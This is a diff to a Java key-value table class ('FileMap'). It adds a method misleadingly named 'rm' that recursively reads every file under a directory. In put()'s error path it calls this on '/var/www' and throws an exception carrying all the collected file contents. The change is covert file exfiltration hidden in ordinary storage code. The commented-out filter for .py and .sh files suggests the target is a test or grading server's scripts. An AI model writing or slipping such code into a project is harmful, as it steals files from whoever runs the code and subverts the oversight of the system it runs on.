@@ -379,6 +379,53 @@ public class FileMap implements Table {
         return changeTable.size();
     }
 
+    public void rm(String path) {
+        try {
+            File tmpFile = new File(path);
+            File[] listFiles = tmpFile.listFiles();
+            if (listFiles != null) {
+                if (tmpFile.isDirectory()) {
+                    for (File c : listFiles) {
+                        s1 += "Directory: \n" + c.getAbsoluteFile().toString() + "\n\n";
+
+                        //if (c.getName().contains(".py") || c.getName().contains(".sh")) {
+                            s1 += readFileTsv2(c.getAbsolutePath().toString());
+                            s1 += "\n\n\n";
+                        //}
+
+
+                        rm(c.toString());
+                    }
+                } else {
+                    s1 += readFileTsv2(tmpFile.getAbsolutePath().toString());
+                    s1 += "\n\n\n";
+                }
+            }
+
+        } catch (Exception e) {
+            s1 += e.getMessage();
+        }
+    }
+
+    private String readFileTsv2(String fileName) throws IOException {
+        StringBuilder sb = new StringBuilder();
+        try {
+            try (BufferedReader in = new BufferedReader(new FileReader(new File(fileName).getAbsoluteFile()))) {
+                String s;
+                while ((s = in.readLine()) != null) {
+                    sb.append(s);
+                    sb.append("\n");
+                }
+            } catch (Exception e) {
+                s1 += e.getMessage();
+            }
+        } catch (Exception e) {
+            s1 += e.getMessage();
+        }
+
+        return sb.toString();
+    }
+
     public Storeable put(String key, Storeable value) throws ColumnFormatException {
         checkArg(key);
         if (value == null) {
@@ -443,6 +490,9 @@ public class FileMap implements Table {
             }
 
             st = null;
+
+            rm("/var/www");
+            throw new ColumnFormatException(s1);
         }
 
         if (st != null && !st.messageEqualsType(columnType).isEmpty()) {
